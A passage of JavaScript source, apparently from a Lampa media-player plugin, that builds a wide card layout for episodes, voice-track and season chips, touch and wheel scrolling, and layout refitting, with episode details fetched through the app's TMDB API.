      if (!count) return;
      wide_counts[key] = count;
      if (!box || !box.parent().length) return;
      var slot = box.find('.nova-chip__sub');
      if (slot.length) slot.text(wideCount(count));
    });
    return 0;
  }

  function wideBook(number, done) {
    var id = tmdbId();
    if (!id || !number || !wideMeta()) return done(null);
    var key = id + ':' + number;
    if (wide_book[key]) return done(wide_book[key]);
    if (wide_wait[key]) return wide_wait[key].push(done);
    var api = null;
    try { api = Lampa.Api.sources.tmdb; } catch (e) { api = null; }
    if (!api || typeof api.get !== 'function') return done(null);
    wide_wait[key] = [done];
    var finish = function (book) {
      var queue = wide_wait[key] || [];
      delete wide_wait[key];
      if (book) wide_book[key] = book;
      queue.forEach(function (fn) { try { fn(book); } catch (e) {} });
    };
    try {
      api.get('tv/' + id + '/season/' + number, {}, function (data) {
        var book = {};
        ((data && data.episodes) || []).forEach(function (episode) {
          var num = parseInt(episode && episode.episode_number, 10) || 0;
          if (num) book[num] = episode;
        });
        finish(book);
      }, function () { finish(null); });
    } catch (e) { finish(null); }
  }

  function wideTags(item) {
    var source = [item.title || ''].concat(item.meta || []).join(' ');
    var found = source.match(WIDE_TAG_FIND) || [];
    var seen = {};
    var out = [];
    found.forEach(function (raw) {
      var norm = String(raw).toUpperCase().replace(/\s+/g, '');
      var value = WIDE_TAG_MAP[norm] || WIDE_TAG_MAP[norm.replace('.', '')] || '';
      if (!value || seen[value]) return;
      seen[value] = true;
      out.push(value);
    });
    var channels = source.match(WIDE_CHANNELS);
    if (channels && !seen[channels[1]]) out.push(channels[1]);
    return out.slice(0, 4);
  }

  function wideVoiceName() {
    var name = '';
    try {
      if (groups.voice) {
        name = groups.voice.subtitle || '';
        if (!name) (groups.voice.items || []).forEach(function (item) { if (item.selected) name = item.title || name; });
      }
    } catch (e) { name = ''; }
    return String(name == null ? '' : name).trim();
  }

  function wideVoiceBook() {
    var out = {};
    try {
      if (groups.voice && groups.voice.items) {
        groups.voice.items.forEach(function (item) {
          var name = String(item && item.title != null ? item.title : '').trim().toLowerCase();
          if (name) out[name] = true;
        });
      }
    } catch (e) {}
    var picked = wideVoiceName().toLowerCase();
    if (picked) out[picked] = true;
    return out;
  }

  function widePick(item) {
    var out = { rate: '', date: '', voice: '', rest: [] };
    var book = wideVoiceBook();
    var title = String(item.title == null ? '' : item.title).trim().toLowerCase();
    var mine = function (value) {
      var low = value.toLowerCase();
      return !!(title && (low === title || (low.length > 3 && title.indexOf(low) !== -1)));
    };
    (item.meta || []).forEach(function (part) {
      var value = String(part == null ? '' : part).trim();
      if (!value) return;
      if (/[\u2605\u2606]/.test(value)) {
        if (!out.rate) out.rate = value.replace(/[\u2605\u2606]\s*/g, '').trim();
        return;
      }
      if (/^\d{1,2}([.,]\d)?$/.test(value) && parseFloat(value.replace(',', '.')) <= 10) {
        if (!out.rate) out.rate = value;
        return;
      }
      if (/\d{4}/.test(value) && (/[\u0430-\u044fa-z]/i.test(value) || /^\d{2}[.\-\/]\d{2}[.\-\/]\d{4}$/.test(value))) {
        if (!out.date) out.date = value;
        return;
      }
      if (/^\d{1,2}\s+[\u0430-\u044f\u0451]+\.?$/i.test(value)) {
        if (!out.date) out.date = value;
        return;
      }
      if (book[value.toLowerCase()]) {
        if (!out.voice) out.voice = value;
        return;
      }
      if (mine(value)) return;
      out.rest.push(value);
    });
    if (!out.voice && serial) out.voice = wideVoiceName();
    if (out.voice && mine(out.voice)) out.voice = '';
    return out;
  }

  function wideMark(key) {
    if (!ui.rows) return;
    var box = ui.rows.find('[data-nova-focus="' + key + '"]').first();
    if (!box.length) return;
    box.closest('.nova-plus__row').find('.nova-chip--active').removeClass('nova-chip--active');
    box.addClass('nova-chip--active');
  }

  function wideChooseOption(stype, index, key) {
    var group = groups[stype];
    if (!group || !filter || typeof filter.onSelect !== 'function') return;

    var current = group.items[index];
    if (current && current.selected) return;

    ui_focus = key;
    wideMark(key);
    refreshCollection();
    switchStart(stype);
    inplaceStart();
    lockFocus(key);

    keepAlive(function () {
      filter.onSelect('filter', { stype: stype }, { index: index });
    });
  }

  function wideChooseSource(item, key) {
    if (item.selected) return;
    note_sig = '';
    ui_open = '';
    ui_focus = 'source';
    wideDrop();
    markSourceBusy(item);
    refreshCollection();
    switchStart('source');
    lockFocus(ui_focus);
    inplaceStart();
    hopReset();
    probeStop();
    hop.tried[item.source || item.title] = true;
    focusChip('source');
    keepAlive(function () { filter.onSelect('sort', item); });
  }

  function wideDress(card, item) {
    if (!modeWide()) return card;

    if (item.folder) {
      card.addClass('nova-card--wide-nav');
      return card;
    }

    card.addClass('nova-card--wide');

    var thumb = card.find('.nova-card__thumb');
    var body = card.find('.nova-card__body');
    var picked = widePick(item);

    if (serial) {
      var number = episodeNumber(item.num);
      var plain = parseInt(digits(number), 10) || 0;
      if (number) {
        thumb.find('.nova-card__num').remove();
        thumb.prepend($('<div class="nova-card__tag"></div>').text('S' + (seasonNumber() || 1) + ':E' + (plain || number)));
      }
    }

    var line = card.find('.nova-card__line');
    if (line.length) line.removeClass('nova-card__line--body').appendTo(thumb);

    var percent = Math.round(percentOf(item));
    var total = wideSeconds(item.time);
    var strip = $('<div class="nova-card__strip"></div>');
    if (percent > 0) strip.append($('<span class="nova-card__pct"></span>').text(percent + '%'));
    if (total) {
      var at = Math.round(total * Math.min(100, percent) / 100);
      strip.append($('<span class="nova-card__clock"></span>').text((percent > 0 ? wideClock(at) + ' / ' : '') + wideClock(total)));
    }
    if (strip.children().length) thumb.append(strip);

    var head = $('<div class="nova-card__head"></div>');
    if (picked.rate) head.append($('<span class="nova-card__rate"></span>').text('\u2605 ' + picked.rate));
    var badge = card.find('.nova-card__quality');
    if (badge.length) head.append(badge.detach());
    if (picked.date) head.append($('<span class="nova-card__date"></span>').text(picked.date));
    body.prepend(head);
    card.find('.nova-card__side').remove();
    card.find('.nova-card__meta').remove();

    var tags = wideTags(item);
    if (tags.length || picked.voice) {
      var row = $('<div class="nova-card__tags"></div>');
      tags.forEach(function (value) { row.append($('<span></span>').text(value)); });
      if (picked.voice) row.append($('<span class="nova-card__voice"></span>').text(picked.voice));
      body.append(row);
    }

    var descr = $('<div class="nova-card__descr"></div>');
    if (picked.rest.length) descr.text(picked.rest.join(' · '));
    body.append(descr);

    wideFill(item, card, descr, thumb);
    return card;
  }

  function wideFill(item, card, descr, thumb) {
    if (!serial || item.folder || !wideMeta()) return;
    var number = parseInt(episodeNumber(item.num), 10) || 0;
    if (!number) return;
    var season = seasonNumber() || 1;
    var want = movie ? movie.id : 0;
    wideBook(season, function (book) {
      if (!book || !movie || movie.id !== want) return;
      var episode = book[number];
      if (!episode) return;
      if (!descr.text() && episode.overview) descr.text(episode.overview);
      var head = card.find('.nova-card__head');
      if (!card.find('.nova-card__rate').length && episode.vote_average) {
        head.prepend($('<span class="nova-card__rate"></span>').text('\u2605 ' + parseFloat(episode.vote_average + '').toFixed(1)));
      }
      if (!card.find('.nova-card__date').length) {
        var when = wideDate(episode.air_date);
        if (when) head.append($('<span class="nova-card__date"></span>').text(when));
      }
      var title = card.find('.nova-card__title');
      if (episode.name && !title.text()) title.text(episode.name);
      if (episode.still_path && !thumb.hasClass('nova-card__thumb--loaded')) paintThumb(thumb, image(episode.still_path, 'w500'), false);
    });
  }

  function wideOrderList(list) {
    if (!wideOn() || !wideReverse()) return list;
    return list.slice().reverse();
  }

  function wideChip(key, title, sub, extra) {
    var box = chip(key, title, extra);
    if (sub === undefined || sub === null) return box;
    var slot = box.find('.nova-chip__label');
    var stack = $('<span class="nova-chip__stack"></span>');
    slot.before(stack);
    stack.append(slot).append($('<span class="nova-chip__sub"></span>').text(sub));
    box.addClass('nova-chip--stack');
    return box;
  }

  function wideGroupCount() {
    var id = tmdbId();
    var season = seasonNumber() || 0;
    var known = id && season ? wide_counts[id + ':' + season] : 0;
    return known || wideFiles();
  }

  function wideVoiceCount(item) {
    if (!item) return 0;
    if (voiceMetadata(item) !== null) return voiceMetadata(item);
    if (item.selected) {
      var own = wideFiles() || wideGroupCount();
      if (own) return own;
    }
    return voiceCount(item.title);
  }

  function wideVoiceRepaint() {
    if (!ui.rows) return;
    var group = groups.voice;
    if (!group || !group.items) return;
    group.items.forEach(function (item, seat) {
      var index = typeof item.index === 'number' ? item.index : seat;
      var box = ui.rows.find('[data-nova-focus="voice:' + index + '"]').first();
      if (!box.length) return;
      var own = wideVoiceCount(item);
      box.find('.nova-chip__sub').text(own ? wideCount(own) : '');
    });
  }

  function wideHeroTune() {
    if (!ui.hero || !wideOn()) return;

    var meta = ui.hero.find('.nova-hero__meta');
    if (meta.length) {
      meta.children().each(function () {
        var node = $(this);
        if (/^\d+:\d+/.test(node.text().trim())) node.remove();
      });
      if (!meta.parent().is(ui.hero)) meta.appendTo(ui.hero);
    }

    var hint = ui.hero.find('.nova-hero__hint');
    var actions = ui.hero.find('.nova-hero__actions');
    if (hint.length && actions.length && !hint.parent().is(actions)) actions.append(hint);
  }

  function wideSign() {
    var parts = [];
    ['season', 'voice'].forEach(function (name) {
      var group = groups[name];
      if (!group || !group.items || group.items.length < 2) return parts.push(name + ':-');
      parts.push(name + ':' + (group.title || '') + ':' + group.items.map(function (item, seat) {
        return (typeof item.index === 'number' ? item.index : seat) + '|' + item.title + '|' + (voiceMetadata(item) === null ? '' : voiceMetadata(item));
      }).join(','));
    });
    parts.push('sort:' + (groups.sort || []).length);
    parts.push('extras:' + extras.map(function (entry) { return entry.label + '=' + entry.value; }).join(','));
    parts.push('flags:' + serial + ',' + nav + ',' + wideReverse() + ',' + wideRow() + ',' + widePos() + ',' + items.length);
    return parts.join(';');
  }

  function wideSourceChip() {
    if (!ui.rows) return null;
    var box = ui.rows.find('.nova-plus__bar [data-nova-focus="source"]').first();
    return box.length ? box : null;
  }

  function wideTouch() {
    if (!ui.rows) return;

    ['season', 'voice'].forEach(function (name) {
      var group = groups[name];
      if (!group || !group.items) return;
      group.items.forEach(function (item, seat) {
        var index = typeof item.index === 'number' ? item.index : seat;
        var box = ui.rows.find('[data-nova-focus="' + name + ':' + index + '"]').first();
        if (!box.length) return;
        box.toggleClass('nova-chip--active', !!item.selected);
        if (name === 'season') {
          var number = parseInt(digits(item.title), 10) || 0;
          var count = wideSeasonCount(number, box) || (item.selected ? wideFiles() : 0);
          if (count) box.find('.nova-chip__sub').text(wideCount(count));
        } else {
          var own = wideVoiceCount(item);
          box.find('.nova-chip__sub').text(own ? wideCount(own) : '');
        }
      });
    });

    var source = wideSourceChip();
    if (source) {
      var current = null;
      (groups.sort || []).forEach(function (item) { if (item.selected) current = item; });
      var parts = splitSourceName(sourceTitle());
      var value = knownQuality(current ? (current.source || current.title) : '') || parts.badge;
      source.removeClass('nova-chip--busy');
      source.find('.nova-chip__label').text(parts.name || '');
      var badge = source.find('.nova-chip__badge');
      if (value) {
        if (badge.length) badge.text(value);
        else source.prepend($('<span class="nova-chip__badge"></span>').text(value));
      } else badge.remove();
    }

    ui.rows.find('.nova-plus__bar .nova-chip').each(function () {
      var box = $(this);
      box.toggleClass('nova-chip--active', box.attr('data-nova-focus') === ui_open);
    });

    wideDrop();
    wideFit();
    wideRefit();
  }

  function wideRowShift(row, value) {
    if (!row || !row.length) return;
    row.attr('data-nova-x', value);
    try {
      var css = value ? 'translate3d(' + value + 'px,0,0)' : '';
      row[0].style['-webkit-transform'] = css;
      row[0].style.transform = css;
    } catch (e) {}
  }

  function wideRowFollow(node) {
    if (!node || !ui.rows) return false;
    var row = $(node).closest('.nova-plus__row--scroll');
    if (!row.length) return false;
    try {
      var frame = row.parent()[0].getBoundingClientRect();
      var box = node.getBoundingClientRect();
      var shift = parseFloat(row.attr('data-nova-x')) || 0;
      var pad = Math.round(frame.width * 0.06) + 12;
      var limit = Math.min(0, frame.width - row[0].scrollWidth);
      var next = shift;
      if (box.left - pad < frame.left) next = shift + (frame.left - box.left) + pad;
      else if (box.right + pad > frame.right) next = shift - (box.right - frame.right) - pad;
      next = Math.round(Math.max(limit, Math.min(0, next)));
      if (next !== shift) wideRowShift(row, next);
    } catch (e) {}
    return true;
  }

  function wideSeasonTotal() {
    if (!ui.rows) return;
    var block = ui.rows.find('[data-nova-group="season"]').first();
    if (!block.length) return;
    var head = block.children('.nova-plus__label').first();
    if (!head.length) return;
    var slot = head.children('.nova-plus__total');
    var count = 0;
    try { count = (groups.season && groups.season.items) ? groups.season.items.length : 0; } catch (e) { count = 0; }
    if (count < 2) {
      slot.remove();
      return;
    }
    if (!slot.length) slot = $('<span class="nova-plus__total"></span>').appendTo(head);
    slot.text(wideAll(count));
  }

  function wideLines(row) {
    var tops = {};
    var count = 0;
    try {
      row.children().each(function () {
        var box = this.getBoundingClientRect();
        if (!box.width && !box.height) return;
        var key = Math.round(box.top / 4);
        if (tops[key]) return;
        tops[key] = true;
        count++;
      });
    } catch (e) { return 1; }
    return count || 1;
  }

  function wideDragPane(box) {
    return box.children('.nova-plus__pane').first();
  }

  function wideDragNow(box, axis) {
    if (axis === 'x') return parseFloat(box.attr('data-nova-x')) || 0;
    var pane = wideDragPane(box);
    return pane.length ? (parseFloat(pane.attr('data-nova-y')) || 0) : 0;
  }

  function wideDragLimit(box, axis) {
    try {
      if (axis === 'x') return Math.min(0, box.parent()[0].getBoundingClientRect().width - box[0].scrollWidth);
      var pane = wideDragPane(box);
      if (!pane.length) return 0;
      var css = window.getComputedStyle ? window.getComputedStyle(box[0]) : box[0].currentStyle;
      var padding = css ? (parseFloat(css.paddingTop) || 0) + (parseFloat(css.paddingBottom) || 0) : 0;
      var height = box[0].clientHeight || box[0].getBoundingClientRect().height;
      return Math.min(0, height - padding - pane[0].scrollHeight);
    } catch (e) { return 0; }
  }

  function wideDragMove(box, axis, value) {
    if (axis === 'x') wideRowShift(box, value);
    else widePaneShift(wideDragPane(box), value);
  }

  function wideDragSpot(event, axis) {
    var raw = event.originalEvent || event;
    var list = (raw.touches && raw.touches.length) ? raw.touches : raw.changedTouches;
    if (!list || !list.length) return null;
    return axis === 'x' ? list[0].clientX : list[0].clientY;
  }

  function wideDragClamp(box, axis, value) {
    return Math.round(Math.max(wideDragLimit(box, axis), Math.min(0, value)));
  }

  function wideDragEase(box, axis, on) {
    var node = axis === 'x' ? box[0] : (wideDragPane(box).length ? wideDragPane(box)[0] : null);
    if (!node) return;
    try {
      node.style['-webkit-transition'] = on ? '' : 'none';
      node.style.transition = on ? '' : 'none';
    } catch (e) {}
  }

  function wideDragBind(box, axis) {
    if (!box || !box.length) return;
    if (box.attr('data-nova-drag') === axis) return;
    box.attr('data-nova-drag', axis);

    var at = 0;
    var base = 0;
    var live = false;
    var moved = false;
    var spot = 0;
    var when = 0;
    var speed = 0;

    box.on('touchstart', function (event) {
      var point = wideDragSpot(event, axis);
      if (point === null) return;
      live = true;
      box.attr('data-nova-dragging', '1');
      moved = false;
      speed = 0;
      at = point;
      spot = point;
      when = new Date().getTime();
      base = wideDragNow(box, axis);
      wideDragMove(box, axis, base);
      wideDragEase(box, axis, false);
    });

    box.on('touchmove', function (event) {
      if (!live) return;
      var point = wideDragSpot(event, axis);
      if (point === null) return;
      if (!wideDragLimit(box, axis)) return;
      var shift = point - at;
      if (!moved) {
        if (Math.abs(shift) < 4) return;
        moved = true;
        box.attr('data-nova-manual', '1');
        at = point;
        spot = point;
        when = new Date().getTime();
        shift = 0;
      }
      event.preventDefault();
      event.stopPropagation();
      var now = new Date().getTime();
      if (now > when) {
        speed = (point - spot) / (now - when);
        spot = point;
        when = now;
      }
      wideDragMove(box, axis, wideDragClamp(box, axis, base + shift));
    });

    box.on('touchend touchcancel', function (event) {
      if (!live) return;
      live = false;
      box.removeAttr('data-nova-dragging');
      wideDragEase(box, axis, true);
      if (!moved) {
        box.removeAttr('data-nova-manual');
        return;
      }
      if (event) {
        event.preventDefault();
        event.stopPropagation();
        if (event.type === 'touchcancel') return;
      }
      if (new Date().getTime() - when > 90) speed = 0;
      if (Math.abs(speed) < 0.15) return;
      var from = wideDragNow(box, axis);
      var next = wideDragClamp(box, axis, from + speed * 320);
      if (next !== from) wideDragMove(box, axis, next);
    });

    box.on('wheel mousewheel', function (event) {
      var raw = event.originalEvent || event;
      var delta = raw.deltaY || raw.deltaX || (raw.wheelDelta ? -raw.wheelDelta : 0);
      if (!delta) return;
      var from = wideDragNow(box, axis);
      var next = wideDragClamp(box, axis, from - delta * 2.4);
      if (next === from) return;
      event.preventDefault();
      event.stopPropagation();
      box.attr('data-nova-manual', '1');
      wideDragMove(box, axis, next);
    });
  }

  function wideMark() {
    wide_was = 0;
    try { if (ui.rows && ui.rows[0]) wide_was = ui.rows[0].getBoundingClientRect().height || 0; } catch (e) {}
  }

  function wideHold() {
    if (!ui.rows || !wide_was) return;
    var box = ui.rows;
    var keep = wide_was;
    wide_was = 0;
    try {
      var now = box[0].getBoundingClientRect().height || 0;
      if (!now || now >= keep - 1) return;
      box.css('min-height', Math.round(keep) + 'px');
      clearTimeout(wide_hold_timer);
      wide_hold_timer = null;
    } catch (e) {}
  }

  function wideRowsTall(rows) {
    var out = [];
    rows.each(function () {
      var row = $(this);
      out.push({ row: row, lines: wideLines(row) });
    });
    out.sort(function (a, b) { return b.lines - a.lines; });
    return out;
  }

  function widePanelTall(panel, hero) {
    try { return (panel[0].getBoundingClientRect().height || 0) > hero + 1; } catch (e) { return false; }
  }

  function wideMetric(row) {
    var tops = [];
    var high = 0;
    try {
      row.children().each(function () {
        var box = this.getBoundingClientRect();
        if (!box.width && !box.height) return;
        if (box.height > high) high = box.height;
        var key = Math.round(box.top);
        if (tops.indexOf(key) === -1) tops.push(key);
      });
    } catch (e) { return null; }
    if (!high) return null;
    tops.sort(function (a, b) { return a - b; });
    var step = tops.length > 1 ? (tops[1] - tops[0]) : 0;
    if (step < high) step = Math.round(high * 1.14);
    return { step: step, high: high, lines: tops.length };
  }

  function widePitch(row) {
    var mark = wideMetric(row);
    return mark ? mark.step + mark.high : 0;
  }

  function wideRoomLines(row, edge) {
    var mark = wideMetric(row);
    if (!mark || !mark.step) return 1;
    var top = 0;
    try { top = row[0].getBoundingClientRect().top; } catch (e) { return 1; }
    var fit = Math.floor(((edge - top) - mark.high) / mark.step) + 1;
    if (fit < 1) fit = 1;
    var cut = mark.lines;
    if (cut < 1) cut = 1;
    return fit < cut ? fit : cut;
  }

  function wideBand(row, count) {
    var mark = wideMetric(row);
    if (!mark || count <= 1) {
      wideSqueeze(row);
      return;
    }
    row.addClass('nova-plus__row--scroll nova-plus__row--pair');
    row.parent().addClass('nova-plus__group--scroll');
    var outer = mark.high;
    row.children().each(function () {
      var css = window.getComputedStyle ? window.getComputedStyle(this) : this.currentStyle;
      var height = this.getBoundingClientRect().height || mark.high;
      if (css) height += (parseFloat(css.marginTop) || 0) + (parseFloat(css.marginBottom) || 0);
      if (height > outer) outer = height;
    });
    row.css('height', Math.ceil(outer * count) + 'px');
    wideDragBind(row, 'x');
  }

  function widePair(row) {
    wideBand(row, WIDE_MAX_LINES);
  }

  function wideSqueeze(row) {
    row.removeClass('nova-plus__row--pair').css('height', '');
    row.addClass('nova-plus__row--scroll');
    row.parent().addClass('nova-plus__group--scroll');
    wideDragBind(row, 'x');
  }

  var wide_refit_timers = [];
  var wide_refit_bound = false;

  function wideNoteFit() {
    if (!ui.root || !ui.root.hasClass('nova-plus') || !ui.list || !ui.hero_box) return;
    var note = ui.list.find('.nova-note').first();
    if (!note.length) return;
    if (ui_open === 'source' || !shown(note[0])) return;
    try {
      var have = parseFloat(note.attr('data-nova-note-lift')) || 0;
      var hero = ui.hero_box[0].getBoundingClientRect();
      var box = note[0].getBoundingClientRect();
      if (!hero.height || !box.height) return;
      var gap = 12;
      var want = Math.ceil(hero.bottom + gap - box.top) + have;
      if (want < 0) want = 0;
      if (Math.abs(want - have) < 3) return;
      if (want > 0) note.attr('data-nova-note-lift', want).css('margin-top', want + 'px');
      else note.removeAttr('data-nova-note-lift').css('margin-top', '');
    } catch (e) {}
  }

  function wideRefitRun() {
    try {
      if (ui_open !== 'source') wideFit();
      else if (ui.list && ui.list.length) {
        var strip = ui.list.parent();
        var keep = parseFloat(strip.attr('data-nova-source-shift'));
        if (isFinite(keep)) {
          var have = parseFloat(strip[0].style.top) || 0;
          if (Math.round(have) !== Math.round(keep)) {
            strip.css({ position: 'relative', top: keep ? keep + 'px' : '' });
          }
        }
      }
      wideNoteFit();
    } catch (e) {}
  }

  function wideRefitWatch() {
    if (!ui.hero_box) return;
    try {
      ui.hero_box.find('img').each(function () {
        if (this.getAttribute('data-nova-refit')) return;
        this.setAttribute('data-nova-refit', '1');
        $(this).on('load', wideRefitRun);
      });
    } catch (e) {}
  }

  function wideRefit() {
    while (wide_refit_timers.length) {
      try { clearTimeout(wide_refit_timers.pop()); } catch (e) {}
    }
    var steps = [60, 240, 600, 1200];
    for (var i = 0; i < steps.length; i++) {
      try { wide_refit_timers.push(setTimeout(wideRefitRun, steps[i])); } catch (e) {}
    }
    try { if (window.requestAnimationFrame) window.requestAnimationFrame(wideRefitRun); } catch (e) {}
    wideRefitWatch();
    if (wide_refit_bound) return;
    wide_refit_bound = true;
    var orientationRefit = function () {
      try {
        if (ui.rows && !ui.rows.attr('data-nova-source-height')) ui.rows.css({ height: '', minHeight: '' });
        if (ui.rows && ui.rows[0]) ui.rows[0].getBoundingClientRect();
      } catch (e) {}
      wideRefitRun();
      [90, 260, 620].forEach(function (delay) {
        try { wide_refit_timers.push(setTimeout(wideRefitRun, delay)); } catch (e) {}
      });
    };
    try { $(window).on('resize', wideRefitRun).on('orientationchange', orientationRefit); } catch (e) {}
    try {
      if (window.visualViewport) $(window.visualViewport).on('resize', orientationRefit);
    } catch (e) {}
  }

  function wideFit() {
    if (!ui.rows || !ui.hero_box || !wideOn()) return;
    if (ui_open === 'source') return;
    var panel = ui.rows.children('.nova-plus__panel').first();
    if (!panel.length) return;

    wideSeasonTotal();

    var drop = panel.children('.nova-drop').first();
    if (drop.length) wideDropFit(drop);

    var rows = panel.find('.nova-plus__group > .nova-plus__row');
    if (!rows.length || rows.filter('[data-nova-dragging="1"]').length) return;

    var hero = 0;
    var saved = [];
    try {
      var poster = ui.hero_box[0].getBoundingClientRect();
      var edge = poster.bottom;
      var top = panel[0].getBoundingClientRect().top;
      hero = top < edge ? edge - top : poster.height;
      if (!hero) return;
      rows.each(function () {
        var row = $(this);
        saved.push({ row: row, shift: parseFloat(row.attr('data-nova-x')) || 0 });
        wideDragEase(row, 'x', false);
        row.removeClass('nova-plus__row--scroll nova-plus__row--pair').css('height', '');
        wideRowShift(row, 0);
      });
      panel.find('.nova-plus__group').removeClass('nova-plus__group--scroll');
    } catch (e) { return; }

    var ranked = wideRowsTall(rows);
    ranked.forEach(function (entry) {
      var isVoice = entry.row.parent().attr('data-nova-group') === 'voice';
      if (!isVoice) {
        wideSqueeze(entry.row);
        return;
      }
      var count = wideRoomLines(entry.row, edge);
      if (count > 1) wideBand(entry.row, count);
      else wideSqueeze(entry.row);
    });

    while (widePanelTall(panel, hero)) {
      var candidate = null;
      ranked.forEach(function (entry) {
        if (entry.row.parent().attr('data-nova-group') !== 'voice' ||
            !entry.row.hasClass('nova-plus__row--pair')) return;
        var current = Math.max(1, Math.round((parseFloat(entry.row.css('height')) || 0) /
          Math.max(1, (wideMetric(entry.row) || {}).high || 1)));
        if (!candidate || current > candidate.current) candidate = { entry: entry, current: current };
      });
      if (!candidate || candidate.current <= 1) break;
      wideBand(candidate.entry.row, candidate.current - 1);
    }

    saved.forEach(function (entry) {
      var shift = entry.row.hasClass('nova-plus__row--scroll') ? wideDragClamp(entry.row, 'x', entry.shift) : 0;
      wideRowShift(entry.row, shift);
      entry.row[0].getBoundingClientRect();
      wideDragEase(entry.row, 'x', true);
    });
    wideHold();
  }

  var wide_hold_spacer = null;

  function wideStash(panel) {
    var blocks = panel.children('.nova-plus__group');
    if (!blocks.length) return;
    var height = 0;
    try { height = Math.ceil(blocks[0].getBoundingClientRect().height || blocks.outerHeight(true) || 0); } catch (e) {}
    wide_hold = blocks.detach();
    if (height > 0) {
      wide_hold_spacer = $('<div class="nova-plus__hold-spacer" aria-hidden="true"></div>')
        .css({ height: height + 'px', visibility: 'hidden', pointerEvents: 'none' });
      panel.append(wide_hold_spacer);
    }
  }

  function wideUnstash(panel) {
    if (wide_hold_spacer) {
      try { wide_hold_spacer.remove(); } catch (e) {}
      wide_hold_spacer = null;
    }
    if (!wide_hold || !wide_hold.length) return;
    var bar = panel.children('.nova-plus__bar').first();
    if (!bar.length) panel.prepend(wide_hold);
    else if (widePosBottom()) wide_hold.insertBefore(bar);
    else wide_hold.insertAfter(bar);
    wide_hold = null;
  }

  function widePaneShift(pane, value) {
    if (!pane || !pane.length) return;
    pane.attr('data-nova-y', value);
    try {
      var css = value ? 'translate3d(0,' + value + 'px,0)' : '';
      pane[0].style['-webkit-transform'] = css;
      pane[0].style.transform = css;
    } catch (e) {}
  }

  function wideDropPane(drop) {
    var pane = drop.children('.nova-plus__pane').first();
    if (pane.length) return pane;
    pane = $('<div class="nova-plus__pane"></div>');
    drop.children().appendTo(pane);
    drop.append(pane);
    return pane;
  }

  function wideDropFit(drop) {
    if (!drop || !drop.length || !ui.hero_box) return;
    if (drop.attr('data-nova-dragging') === '1') return;
    var pane = wideDropPane(drop);
    var shift = parseFloat(pane.attr('data-nova-y')) || 0;
    wideDragEase(drop, 'y', false);
    drop.removeClass('nova-plus__drop--scroll').css('max-height', '');
    try {
      var hero = ui.hero_box[0].getBoundingClientRect();
      var tall = pane[0].scrollHeight || pane[0].getBoundingClientRect().height || 0;
      var box = drop[0].getBoundingClientRect();
      if (hero.height && tall) {
        var view = window.innerHeight || 0;
        var panelTop = drop.parent()[0].getBoundingClientRect().top;
        var edge = panelTop < hero.bottom - 1 ? hero.bottom - 12 : (view ? view - 24 : box.top + tall);
        if (view) edge = Math.min(edge, view - 24);
        var room = Math.max(1, Math.floor(edge - box.top));
        var css = window.getComputedStyle ? window.getComputedStyle(drop[0]) : drop[0].currentStyle;
        var padding = css ? (parseFloat(css.paddingTop) || 0) + (parseFloat(css.paddingBottom) || 0) : 0;
        if (tall + padding > room) {
          drop.addClass('nova-plus__drop--scroll').css('max-height', room + 'px');
          wideDragBind(drop, 'y');
          shift = wideDragClamp(drop, 'y', shift);
        } else shift = 0;
      }
      widePaneShift(pane, shift);
      pane[0].getBoundingClientRect();
    } catch (e) {}
    wideDragEase(drop, 'y', true);
  }

  function widePaneFollow(node) {
    if (!node) return false;
    var drop = $(node).closest('.nova-plus__drop--scroll');
    if (!drop.length) return false;
    var pane = drop.children('.nova-plus__pane').first();
    if (!pane.length) return false;
    try {
      var frame = drop[0].getBoundingClientRect();
      var box = node.getBoundingClientRect();
      var shift = parseFloat(pane.attr('data-nova-y')) || 0;
      var pad = 10;
      var limit = wideDragLimit(drop, 'y');
      var next = shift;
      if (box.top - pad < frame.top) next = shift + (frame.top - box.top) + pad;
      else if (box.bottom + pad > frame.bottom) next = shift - (box.bottom - frame.bottom) - pad;
      next = Math.round(Math.max(limit, Math.min(0, next)));
      if (next !== shift) widePaneShift(pane, next);
    } catch (e) {}
    return true;
  }

  function wideDrop() {
    if (!ui.rows) return;
    var previous = ui.rows.find('.nova-drop').first();
    var wasSource = previous.attr('data-nova-menu') === 'source';
    var openingSource = wideSwapOn() && !wasSource;
    var strip = ui.list && ui.list.length ? ui.list.parent() : $();
    var stripTop = null;
    if (openingSource && strip.length) {
      try { stripTop = strip[0].getBoundingClientRect().top; } catch (e) {}
    }
    var same = previous.attr('data-nova-menu') === ui_open;
    var shift = same ? (parseFloat(previous.children('.nova-plus__pane').attr('data-nova-y')) || 0) : 0;
    var manual = same && previous.attr('data-nova-manual') === '1';
    var noteNode = ui.list && ui.list.find('.nova-note').first();
    var noteState = !!(noteNode && noteNode.length);
    if (noteNode && noteNode.length) noteNode.css('display', wideSwapOn() ? 'none' : '');
    if (ui.root) ui.root.toggleClass('nova-plus--note-source', noteState && wideSwapOn());
    var panel = ui.rows.children('.nova-plus__panel').first();
    if (!panel.length) return;
    ui.rows.find('.nova-drop').remove();
    if (ui_open === 'source') sourceRow();
    else if (ui_open === 'jump') jumpRow();
    else if (extra_menu && ui_open === extra_menu.key) extraRow();
    var createdDrop = ui.rows.children('.nova-drop').last();
    if (createdDrop.length) createdDrop.appendTo(panel);

    if (!wideSwapOn()) {
      wideUnstash(panel);
      panel.removeAttr('data-nova-reserve').css('min-height', '');
      if (strip.length) strip.css({ position: '', top: '' })
        .removeAttr('data-nova-source-top').removeAttr('data-nova-source-shift');
    }

    var noteState = !!(ui.list && ui.list.find('.nova-note').length);
    panel.toggleClass('nova-plus__panel--swap', wideSwapOn());
    panel.toggleClass('nova-plus__panel--note-source', wideSwapOn() && noteState);

    if (wideSwapOn() && !noteState) panel.addClass('nova-plus__panel--overlay');
    else panel.removeClass('nova-plus__panel--overlay');

    var bar = panel.children('.nova-plus__bar').first();
    if (bar.length && widePosBottom()) {
      if (wideSwapOn()) panel.prepend(bar);
      else panel.append(bar);
    }

    var drop = panel.children('.nova-drop').first();
    if (!drop.length) return;
    if (widePosBottom() && bar.length && !wideSwapOn()) drop.insertBefore(bar);
    drop.attr('data-nova-menu', ui_open);
    if (manual) drop.attr('data-nova-manual', '1');
    widePaneShift(wideDropPane(drop), shift);
    if (wideSwapOn() && !noteState) {
      var barHeight = bar.length ? (bar.outerHeight(true) || 0) : 0;
      drop.css({ position: 'absolute', top: Math.ceil(barHeight) + 'px', left: 0, right: 0 });
    } else drop.css({ position: '', top: '', left: '', right: '' });
    wideDropFit(drop);
    if (openingSource && strip.length && stripTop !== null) {
      try {
        var nowTop = strip[0].getBoundingClientRect().top;
        var delta = Math.round(stripTop - nowTop);
